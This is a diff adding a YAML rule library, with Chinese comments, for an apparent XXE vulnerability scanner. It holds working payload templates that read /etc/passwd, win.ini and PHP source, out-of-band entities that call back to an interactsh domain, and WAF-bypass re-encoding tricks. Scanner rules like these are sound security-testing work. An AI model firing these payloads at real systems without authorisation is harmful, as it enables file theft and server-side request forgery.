@@ -1,0 +1,136 @@
+# XXE（XML 外部实体注入 / XML External Entity）规则库。
+#
+# 这个文件只放“检测用什么 payload、命中怎么判定”，不放调度逻辑。
+# rules.py 是很薄的加载器，把 {root} {entity} {uri} {domain} 这些占位符替换成实际值。
+#
+# 设计目标：覆盖面广、通用性强、检出率高，同时把误报压到最低。
+#
+# 【XXE 是什么】应用把用户提交的 XML 交给一个“会解析外部实体/DTD”的解析器。攻击者在 XML
+# 里声明一个外部实体（<!ENTITY xxe SYSTEM "...">）或外部 DTD（<!DOCTYPE r SYSTEM "...">），
+# 解析器一旦去解析它，就可能：读本地文件（file://）、向外发请求（http:// —— 相当于 SSRF）、
+# 甚至在报错里泄露文件内容。检测核心是证明“解析器真的解析了我们的外部实体”。
+#
+# 【两种确认通道（都低误报）】
+#   1. 带外（OOB）—— 最通用、覆盖面最广，也是首选：
+#      在 XML 里塞一个指向我们唯一子域的外部实体 / 外部 DTD，解析器一旦去解析（哪怕只做
+#      DNS 解析）就回连 interactsh 公共服务，轮询到带对应 token 的交互即确认。它完全不依赖
+#      响应是否回显，天然覆盖“盲打 XXE”（真实场景里绝大多数 XXE 都是盲的）；回连来源 IP 是
+#      目标服务器，天然证明是“服务端解析器”发起。见 oob.py + tools/interactsh_client.py。
+#   2. 带内文件读取（in-band）—— 目标无出网时的兜底，且危害确认最直观：
+#      把外部实体指向本地敏感文件（file:///etc/passwd），并把实体引用（&xxe;）注入到原 XML 的
+#      叶子文本里；只有解析器真的读到文件、并把内容回显，响应里才会出现该文件的 signature
+#      （/etc/passwd 的 root:x:0:0:）。参数被原样反射只会回显 payload 字符串，不含 signature，
+#      因此误报极低。再要求 signature 不在 baseline 里，进一步排除页面自带该特征的极端情况。
+#
+# 【绕过写法：主流变体直接并进基础 payload】
+#   XXE 每个注入点需要发送的请求本来就不多，所以把最有效的“外部实体落点写法”直接写进基础
+#   模板，一轮覆盖：外部通用实体（需正文引用）、外部参数实体（DTD 解析即触发、无需正文引用）、
+#   外部 DTD（DOCTYPE SYSTEM，解析即触发）、XInclude（无 DOCTYPE 时读文件）。
+#   另保留一个很薄的 tamper 阶段（见文件末尾），只在响应像被 WAF 拦、或开启 deep_tamper 且未
+#   命中时，对整段 XML 追发少量编码/混淆变体（UTF-16 重编码、DOCTYPE 内换行）作为兜底。
+
+# ---------------------------------------------------------------------------
+# 带内文件读取目标（in-band）。
+#   uri       外部实体指向的本地资源。
+#   signature “只有真的读到该文件才会出现”的正则，绝不出现在 payload 里，因此反射不误报。
+#   os        unix / windows / any，识别出目标 OS 后按 os 裁剪，减少无效请求。
+#   __php_base64__ 是特殊哨兵：不做正则匹配，改为在响应里找 base64 块解码后判 PHP 源码 / passwd。
+# ---------------------------------------------------------------------------
+files:
+  # /etc/passwd 首行形如 root:x:0:0:root:/root:/bin/bash，:0:0: 是 root 账号独有特征。
+  - { name: unix_passwd,   os: unix,    uri: 'file:///etc/passwd',    signature: 'root:.*?:0:0:' }
+  # /proc/version 内容形如 "Linux version 5.x ..."，passwd 被限制时的 unix 兜底目标。
+  - { name: proc_version,  os: unix,    uri: 'file:///proc/version',  signature: 'Linux version [0-9]' }
+  # win.ini 是 Windows 上人人都有的 ini，含 [fonts]/[extensions]/[mci extensions] 段。
+  - { name: win_ini,       os: windows, uri: 'file:///c:/windows/win.ini', signature: '(?i)\[(fonts|extensions|mci extensions)\]' }
+  # PHP 源码：用 php://filter 把当前脚本 base64 出来，解码见 <?php 即读到服务端源码。
+  - { name: php_index,     os: unix,    uri: 'php://filter/convert.base64-encode/resource=index.php', signature: '__php_base64__' }
+
+# ---------------------------------------------------------------------------
+# 带内注入模板（in-band）。scanner 会用解析出的 XML 外壳（root 名、原正文）来组装：
+#   最终 payload = <?xml ...?> + doctype + 正文（ref 非空时把 ref 注入叶子文本）。
+#   占位符：{root} 根元素名、{entity} 实体名（固定 xxe）、{uri} 上面 files 的 uri。
+# ---------------------------------------------------------------------------
+inband_templates:
+  # 外部通用实体：最经典。需要把 &xxe; 引用注入到正文某个会被回显的元素文本里。
+  - name: general_entity
+    doctype: '<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "{uri}">]>'
+    ref: '&{entity};'
+  # 外部参数实体 + 内部实体拼接：绕过“只过滤普通实体”的场景，仍靠正文 &xxe; 回显。
+  - name: nested_entity
+    doctype: '<!DOCTYPE {root} [<!ENTITY % p SYSTEM "{uri}"><!ENTITY {entity} "%p;">]>'
+    ref: '&{entity};'
+
+# scanner 内建、无需 DOCTYPE 的带内特殊形态（值为 files 里的 uri，命中同样按 signature 判定）：
+#   xinclude —— 应用禁用 DOCTYPE/实体但仍解析 XML 时，用 XInclude 读文件（parse="text"）。
+# 只对可文本回显的文件有意义（passwd / proc_version / win.ini；php_index 不走 XInclude）。
+inband_specials:
+  - xinclude
+
+# ---------------------------------------------------------------------------
+# 带外（OOB）模板。{domain} 是 interactsh 分配的唯一子域，解析器一去解析就回连。
+#   external_dtd / param_entity 在 DTD 解析阶段即触发，无需正文引用（ref 为空），最通用；
+#   general_entity 需要正文里出现 &xxe;（scanner 会注入叶子文本）。
+# ---------------------------------------------------------------------------
+oob_templates:
+  # 外部 DTD：DOCTYPE 直接 SYSTEM 一个外部地址，解析器拉取即回连。触发面最广，无需正文引用。
+  - name: external_dtd
+    doctype: '<!DOCTYPE {root} SYSTEM "http://{domain}/x.dtd">'
+    ref: ''
+  # 外部参数实体：在内部子集里声明并立即引用 %xxe;，DTD 解析阶段即触发，无需正文引用。
+  - name: param_entity
+    doctype: '<!DOCTYPE {root} [<!ENTITY % {entity} SYSTEM "http://{domain}/"> %{entity};]>'
+    ref: ''
+  # 外部通用实体：声明 xxe 指向外部地址，正文里引用 &xxe; 触发。覆盖“只解析被引用实体”的解析器。
+  - name: general_entity
+    doctype: '<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "http://{domain}/">]>'
+    ref: '&{entity};'
+
+# 开启 full_payload_scan 或 deep_tamper 时额外追加的带外变体，进一步拓宽触发面/绕过覆盖。
+# 每个都要占用一个唯一域名 + 一次请求。
+oob_templates_extra:
+  # 参数实体 + 外部 DTD 组合：先声明外部参数实体再引用，部分解析器只在这种写法下才拉取。
+  - name: param_entity_dtd
+    doctype: '<!DOCTYPE {root} [<!ENTITY % {entity} SYSTEM "http://{domain}/e.dtd"> %{entity};]>'
+    ref: ''
+  # 非 http scheme：libxml 等支持 ftp，服务端解析主机时至少 DNS 解析 {domain}，触发 DNS 回连。
+  - name: ftp_entity
+    doctype: '<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "ftp://{domain}/x">]>'
+    ref: '&{entity};'
+
+# ---------------------------------------------------------------------------
+# WAF / 拦截页识别。命中后对整段 XML payload 尝试 tamper 变形绕过。结构和其它插件一致。
+# ---------------------------------------------------------------------------
+waf_detection:
+  status_codes: [403, 406, 429, 501, 999]
+  header_keywords:
+    - x-waf
+    - waf
+    - cloudflare
+    - x-sucuri-id
+    - incapsula
+    - x-denied-reason
+  body_keywords:
+    - waf
+    - forbidden
+    - access denied
+    - blocked
+    - security policy
+    - not acceptable
+    - doctype is not allowed
+    - external entit
+    - 拦截
+    - 非法请求
+    - 已被防火墙
+    - 安全防护
+
+# 单个 payload 被 WAF 拦截时，最多尝试多少个 tamper 变形。
+max_tampered_payloads_per_probe: 3
+
+# tamper 变形策略（很薄的兜底，主流写法已并进基础 payload）。
+# tampers 是 tamper.py 里的函数名，按顺序叠加。整段 XML 级别的变形只对“整个 body 就是 XML”
+# 的注入点应用（编码/BOM 会破坏 URL 参数里的 XML），scanner 会据此判断。
+tamper_profiles:
+  - { name: utf16_reencode,   tampers: [utf16_reencode] }
+  - { name: doctype_newline,  tampers: [doctype_newline] }
+  - { name: utf7_reencode,    tampers: [utf7_reencode] }
